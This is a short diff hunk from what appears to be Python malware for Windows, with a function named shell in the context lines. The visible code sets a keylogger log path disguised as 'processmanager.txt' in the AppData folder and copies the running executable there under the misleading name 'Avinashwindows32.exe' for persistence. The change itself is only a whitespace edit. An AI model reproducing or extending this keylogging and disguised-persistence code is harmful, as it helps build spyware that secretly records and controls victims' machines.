@@ -125,7 +125,7 @@ def shell():
 			except Exception as e:
 				print(e)
 
-keyLogger_path = os.environ["appdata"] + "\\processmanager.txt"
+keyLogger_path =  os.environ["appdata"] + "\\processmanager.txt"
 location = os.environ["appdata"] + "\\Avinashwindows32.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
